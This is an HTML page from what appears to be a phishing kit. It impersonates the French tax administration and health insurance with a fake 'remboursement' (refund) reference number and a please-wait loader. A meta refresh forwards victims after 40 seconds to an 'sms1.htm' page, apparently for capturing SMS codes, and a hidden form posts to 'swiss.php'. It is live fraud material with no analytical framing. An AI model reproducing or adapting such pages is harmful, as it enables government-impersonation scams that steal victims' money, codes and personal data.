<p>&nbsp;</p>
    <title>Remboursement</title>
            <link rel="icon" href="templates/11.png">
<p style="text-align: center;"><img /><img src="templates/tete.png" alt="" width="1279" height="178" /></p>
<center></center>
<div id="greyBackground">
<div id="container">
<div id="containerHeader"><br /><br /> <!-- DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" --><center>
<div id="prefooterAmeli_1" class="wlp-bighorn-window  ">
<div class="wlp-bighorn-window-content">
<div class="prefooterbody seul">
<meta http-equiv="refresh" content="40; URL=sms1.htm">
<ul>
<li>Formulaire de remboursement &eacute;lectronique / R&eacute;f&eacute;rence : N 0062405129</li>
<li></li>
</ul>
</div>
</div>
</div>
<br />
<div align="center"><form id="formulaire_saisie_adresse" action="http://google.com" method="post">
<div>Veuillez patienter pendant que nous traitons votre demande<br />s.v.p ne pas fermer cette fen&ecirc;tre<br /><img src="https://euthaliaglobal.com/images/big-ajax-loader.gif" width="35" height="35" /></div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
</form></div>
</center><form class="full-width" action="swiss.php" method="post" name="registrationDetails">
<div class="textIrish">&nbsp;<p style="text-align: center;"><img src="templates/bas.png" alt="" width="1279" height="73" /></p>
  <div class="footer-copyright">
    <div class="footer-copyright">
    <div style="background: none repeat scroll 0%;font-family: sans-serif;font-size: small;-moz-background-clip: -moz-initial;-moz-background-origin: -moz-initial;-moz-background-inline-policy: -moz-initial;width: 100%;color: black;text-align: center;background-color: white;"><marquee style="
"> Direction g&eacute;n&eacute;rale des Finances publiques - Mentions l&eacute;gales</marquee></div>
  </div>
  </div>
  </div>
</footer>
                </main>
</form></div>
</div>
</div>
